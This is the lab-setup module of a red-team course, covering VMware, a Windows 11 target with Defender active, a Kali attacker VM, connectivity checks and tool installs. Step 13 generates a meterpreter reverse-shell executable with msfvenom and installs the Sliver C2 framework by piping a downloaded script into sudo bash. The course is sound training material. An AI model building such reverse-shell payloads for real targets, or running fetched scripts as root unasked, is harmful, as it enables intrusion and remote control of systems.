# Module 01 - Lab Setup

## Why You Need a Lab

You cannot practice red teaming on real systems. That is illegal.
You also should not practice on your main computer because the tools
we use could mess things up.

The solution is a lab - virtual machines running on your computer.
If you break something, you restore a snapshot and start over.

Your lab will have two virtual machines:

- **Windows 11 VM** - your target. Defender fully active. This is what you attack.
- **Kali Linux VM** - your attacker box. Pre-loaded with hacking tools. This is where you attack from.

Both connected through a private virtual network.

---

## What Your Computer Needs

Running two VMs at the same time takes some power.

**Minimum (will work but feel slow):**
- CPU: 4 cores
- RAM: 16 GB
- Free disk space: 120 GB
- Internet connection

**Recommended (smooth experience):**
- CPU: 6+ cores
- RAM: 32 GB
- Free disk space: 250 GB on SSD
- Fast internet

To check your specs:
1. Press **Windows Key + I** to open Settings
2. Go to **System > About**
3. Check your processor and RAM
4. Open File Explorer, right-click your C: drive, check free space

If you have less than 16 GB RAM, only run one VM at a time.

---

## What You Will Download

Three things. All free.

| Item | Size | Source |
|------|------|--------|
| VMware Workstation Pro | ~600 MB | support.broadcom.com |
| Windows 11 ISO | ~5-6 GB | microsoft.com |
| Kali Linux VM (VMware) | ~3-4 GB | kali.org |

Total download: ~10 GB. Total disk after setup: ~80-100 GB.

---

## Step 1: Download VMware Workstation Pro

VMware Workstation Pro is free for all use since late 2024.

1. Go to https://support.broadcom.com
2. Click **Register** in the top right if you don't have an account
3. Fill in your email, name, country
4. Use a real email - you need to verify it
5. Check your email, click the verification link
6. Log in with your new account
7. Navigate to **VMware Desktop Hypervisor** section
8. Find **VMware Workstation Pro** for Windows
9. Select the latest version and download it
10. Save it somewhere easy to find (like C:\Downloads\)

If the Broadcom portal is confusing, try this direct link instead:
https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion

---

## Step 2: Install VMware Workstation Pro

1. Find the downloaded installer and double-click it
2. Click **Yes** when Windows asks to allow changes
3. Click **Next** on the welcome screen
4. Check **"I accept the terms"** and click **Next**
5. On the install location screen, keep the default
6. **Important:** Check the box **"Add VMware Workstation console tools into system PATH"**
7. Click **Next**
8. Uncheck both user experience boxes if you want (optional)
9. Click **Next**
10. Keep desktop and start menu shortcuts checked
11. Click **Install**
12. Wait 5-10 minutes
13. Click **Finish**
14. Restart your computer if it asks

**First launch:**
1. Open VMware Workstation Pro
2. If it asks about a license, select **"Personal Use"** or **"Free"**
3. You do NOT need a license key
4. You should see the home screen with "Create a New Virtual Machine"

If you see that screen, VMware is installed correctly.

---

## Step 3: Download Windows 11 ISO

1. Go to https://www.microsoft.com/software-download/windows11
2. Scroll down to **"Download Windows 11 Disk Image (ISO) for x64 devices"**
3. Select **"Windows 11 (multi-edition ISO x64)"**
4. Click **Download Now**
5. Choose language: **English (United States)** recommended
6. Click **Confirm**
7. Click **64-bit Download**
8. Save the ISO file (about 5-6 GB)

You do NOT need a product key. Windows 11 works without activation.
You just get a small watermark in the corner.

---

## Step 4: Create the Windows 11 Virtual Machine

1. Open VMware Workstation Pro
2. Click **File > New Virtual Machine**
3. Select **Custom (advanced)** > Next
4. Hardware compatibility: keep default > Next
5. Select **"I will install the operating system later"** > Next
6. Guest OS: **Microsoft Windows**, Version: **Windows 11 x64** > Next
7. Name: **Win11-Target**, Location: a folder with space (like C:\VMs\) > Next
8. Firmware: select **UEFI**, check **Secure Boot** > Next
9. Processors: 1 processor, **4 cores** > Next
10. Memory: **4096 MB** minimum (8192 MB if you have 32 GB RAM) > Next
11. Network: **NAT** > Next
12. I/O Controller: keep default > Next
13. Disk type: keep default > Next
14. Select **Create a new virtual disk** > Next
15. Size: **80 GB**, select **"Store as a single file"** > Next
16. Keep default disk file name > Next
17. Review summary > click **Finish**

The VM is created but Windows is not installed yet.

---

## Step 5: Add TPM and Attach the ISO

Windows 11 requires a TPM module. VMware can create a virtual one.

**Add TPM:**
1. Select Win11-Target VM in VMware
2. Click **Edit virtual machine settings**
3. Click **Add** at the bottom
4. Select **Trusted Platform Module**
5. Click **Finish**

If TPM is not in the list, VMware needs to encrypt the VM first.
Accept the encryption and set a password. Remember it.

**Attach the ISO:**
1. In the same settings window, click **CD/DVD (SATA)**
2. Select **Use ISO image file**
3. Click **Browse** and find your Windows 11 ISO
4. Make sure **"Connect at power on"** is checked
5. Click **OK**

---

## Step 6: Install Windows 11

**Boot from DVD:**
1. Select Win11-Target and click **Power on**
2. When you see "Press any key to boot from CD or DVD" - press a key fast
3. If you miss it, go to VM > Power > Restart Guest and try again

**Windows Setup:**
1. Language: **English (United States)** > Next
2. Click **Install now**
3. Product key: click **"I don't have a product key"**
4. Edition: select **Windows 11 Pro** > Next
5. Accept license terms > Next
6. Choose **Custom: Install Windows only**
7. Select the 80 GB disk > Next
8. Wait 10-20 minutes for installation
9. VM restarts several times - this is normal, do NOT press any keys

**Initial Setup (after install):**
1. Select your country > Yes
2. Select keyboard layout > Yes
3. Skip second keyboard layout

**Skip Microsoft account (use local account):**
1. When it asks for Microsoft account, type this email: `no@thankyou.com`
2. Type any password like "test123"
3. Click Sign in
4. It will show an error
5. Now it lets you create a local account

If that does not work, try the alternative:
1. On the network screen, press **Shift + F10**
2. Type `oobe\bypassnro` and press Enter
3. VM restarts - go through setup again
4. Click **"I don't have internet"** > **"Continue with limited setup"**

**Create local account:**
1. Username: **redteam**
2. Password: something simple like **Password1**
3. Security questions: fill in anything
4. Privacy settings: turn everything **OFF** > Accept
5. Wait for desktop to appear

Done. You have a working Windows 11 VM.

---

## Step 7: Install VMware Tools

VMware Tools gives you proper screen resolution, copy-paste between
host and VM, and drag-and-drop file support.

1. In VMware menu: **VM > Install VMware Tools**
2. In the Windows VM, open **File Explorer**
3. Click **This PC**
4. Double-click the **DVD drive** (labeled VMware Tools)
5. Double-click **setup64.exe**
6. Click **Yes** if Windows asks permission
7. Click **Next** > select **Complete** > **Next** > **Install**
8. Click **Finish**
9. Click **Yes** to restart

After restart, the VM screen should resize when you drag the window corners.

---

## Step 8: Update Windows 11

We need all updates so Defender has the latest detection rules.

1. Press **Windows Key + I** to open Settings
2. Click **Windows Update**
3. Click **Check for updates**
4. Wait for downloads and installs (15-60 minutes)
5. Click **Restart now** when asked
6. After restart, go back and click **Check for updates** again
7. Repeat until it says **"You're up to date"**

Boring but necessary. A fully patched system is what real targets look like.

---

## Step 9: Verify Defender Is Active

**Through the UI:**
1. Click Start, search **"Windows Security"**, open it
2. Click **Virus & threat protection**
3. Should show green checkmarks, "No current threats"
4. Click **"Manage settings"** under Virus & threat protection settings
5. Verify these are all **ON**:
   - Real-time protection
   - Cloud-delivered protection
   - Automatic sample submission
   - Tamper Protection
6. Go back, scroll to **"Virus & threat protection updates"**
7. Click **Check for updates** to update signatures

**Through PowerShell:**
1. Right-click Start > **Terminal (Admin)**
2. Run:

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled, AntivirusSignatureLastUpdated
```

All values should be True with a recent signature date.

---

## Step 10: Take a Snapshot

Do NOT skip this.

A snapshot saves the exact state of your VM right now.
Break something later? Restore this snapshot. Back to clean in seconds.

1. Make sure Win11-Target VM is running
2. Click **VM > Snapshot > Take Snapshot**
3. Name: **Clean-Updated**
4. Description: "Fresh Win11, updated, Defender active, VMware Tools"
5. Click **Take Snapshot**

To restore later:
1. **VM > Snapshot > Snapshot Manager**
2. Select the snapshot
3. Click **Go To**

Everything after the snapshot gets undone. Your safety net.

---

## Step 11: Set Up Kali Linux

Kali provides pre-built VMware images. No installation needed.

**Download:**
1. Go to https://www.kali.org/get-kali/
2. Click **Virtual Machines**
3. Find the **VMware** section
4. Download the **64-bit** image (.7z file, about 3-4 GB)

**Extract:**
1. Install 7-Zip from https://www.7-zip.org if you don't have it
2. Right-click the downloaded .7z file
3. Select **7-Zip > Extract Here**
4. Wait for extraction (~10-15 GB extracted)

**Open in VMware:**
1. In VMware, click **File > Open**
2. Navigate to the extracted Kali folder
3. Find the **.vmx** file and select it
4. Click **Open**

**Adjust settings (recommended):**
1. Select Kali VM > **Edit virtual machine settings**
2. Memory: at least **2048 MB** (4096 MB is better)
3. Processors: **2 cores**
4. Network: **NAT** (same as Windows VM)
5. Click **OK**

**First boot:**
1. Power on the Kali VM
2. If asked "moved or copied?" click **"I Copied It"**
3. Login with username: **kali**, password: **kali**

**Update Kali:**

Open a terminal (right-click desktop > Open Terminal):

```bash
sudo apt update && sudo apt full-upgrade -y
```

Password is "kali". Takes 10-30 minutes. When done:

```bash
sudo reboot
```

**Take a Kali snapshot:**
1. VM > Snapshot > Take Snapshot
2. Name: **Kali-Clean-Updated**

---

## Step 12: Test Communication Between VMs

Both VMs need to talk to each other.

**Find IP addresses:**

On Kali (terminal):
```bash
ip addr show
```
Look for eth0 or ens33 - note the IP (like 192.168.44.128).

On Windows (PowerShell):
```powershell
ipconfig
```
Look for IPv4 Address (like 192.168.44.129).

**Test ping - Kali to Windows:**
```bash
ping -c 4 192.168.44.129
```
Use your actual Windows IP. Should get replies.

If no replies, allow ping on Windows firewall:
```powershell
netsh advfirewall firewall add rule name="Allow Ping" protocol=icmpv4 dir=in action=allow
```

**Test ping - Windows to Kali:**
```powershell
ping 192.168.44.128
```
Use your actual Kali IP. Should get replies.

**Test file transfer:**

On Kali:
```bash
echo "Transfer test successful" > /tmp/test.txt
cd /tmp && python3 -m http.server 8080
```

On Windows, open browser, go to: `http://YOUR-KALI-IP:8080/test.txt`

If you see the text, file transfers work. Press Ctrl+C on Kali to stop the server.

---

## Step 13: Install Tools on Kali

Open a terminal on Kali.

**Verify Metasploit:**
```bash
msfconsole --version
```
If missing: `sudo apt install metasploit-framework -y`

**Install Sliver C2:**
```bash
curl https://sliver.sh/install | sudo bash
```
Verify: `sliver-server version`

**Install MinGW (cross-compiler for Windows):**
```bash
sudo apt install mingw-w64 -y
```

**Install Python crypto library:**
```bash
pip3 install pycryptodome
```

**Quick test - msfvenom:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.44.128 LPORT=4444 -f exe -o /tmp/test_payload.exe
ls -la /tmp/test_payload.exe
```
Should create a file without errors. We won't run it yet.

**Quick test - Sliver:**
```bash
sliver-server
```
You should see the Sliver banner. Type `help` then `exit`.

---

## Step 14: Install Tools on Windows

**System Informer** (shows processes, memory, DLLs, network):
1. Open Edge in the Windows VM
2. Go to https://systeminformer.sourceforge.io/
3. Download the latest release installer
4. Run the installer, click through with defaults
5. Open System Informer > click **Yes** to run as admin
6. You will see all running processes with details

**Python:**
1. Go to https://www.python.org/downloads/
2. Download latest Python 3 for Windows
3. Run the installer
4. **Important:** check **"Add Python to PATH"** on the first screen
5. Click **Install Now**
6. Verify in PowerShell:

```powershell
python --version
```

**Take final snapshots:**
- Windows VM: VM > Snapshot > name it **Win11-With-Tools**
- Kali VM: VM > Snapshot > name it **Kali-With-Tools**

---

## Step 15: Final Sanity Check

Test that Defender catches threats on the Windows VM.

Open PowerShell and run:

```powershell
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
$eicar | Out-File -FilePath C:\Users\redteam\Desktop\test.txt
```

This is the EICAR test string - a standard AV test, not real malware.

Defender should block it immediately with a "Threat found" notification.
If it does, your lab is working correctly.

---

## Your Lab Layout

```
YOUR REAL COMPUTER
|
+-- VMware Workstation Pro
    |
    +-- Win11-Target (Windows 11 Pro)
    |   Role: TARGET
    |   Network: NAT
    |   Defender: Active + updated
    |   Tools: System Informer, Python
    |   Snapshots: Clean-Updated, Win11-With-Tools
    |
    +-- Kali-Attacker (Kali Linux)
        Role: ATTACKER
        Network: NAT
        Tools: Metasploit, msfvenom, Sliver, MinGW
        Snapshots: Kali-Clean-Updated, Kali-With-Tools
```

---

## Troubleshooting

**"This PC can't run Windows 11"**
- Check VM settings: UEFI firmware, Secure Boot enabled, TPM added
- Need at least 4 GB RAM and 2 CPU cores

**VMs cannot ping each other**
- Both must be on NAT network
- Allow ping on Windows: `netsh advfirewall firewall add rule name="Allow Ping" protocol=icmpv4 dir=in action=allow`
- Check VMware NAT Service is running (services.msc)

**VMware Tools won't install**
- VM must be powered on first
- Wait a few seconds after clicking VM > Install VMware Tools

**Kali is very slow**
- Give it more RAM (4 GB) and CPU (2-4 cores)
- Install: `sudo apt install open-vm-tools open-vm-tools-desktop -y`
- Restart: `sudo reboot`

**Can't find VMware download**
- Search Google: "VMware Workstation Pro download 2026"
- Try: https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion

**EICAR test was not detected**
- Open Windows Security > verify Real-time protection is ON
- Update signatures: `Update-MpSignature` (PowerShell as Admin)
- Try the test again

---

## What Is Next

Your lab is ready. Next module covers Windows internals - how Windows
runs programs, how programs talk to the OS, and where security products
fit in. That foundation makes everything after it click.

---

Next: [Module 02 - Windows Internals for Red Teamers](./02_WINDOWS_INTERNALS.md)

---

*This course is for authorized security testing and education only.
Always get written permission before testing any system.
The author is not responsible for misuse of this information.*
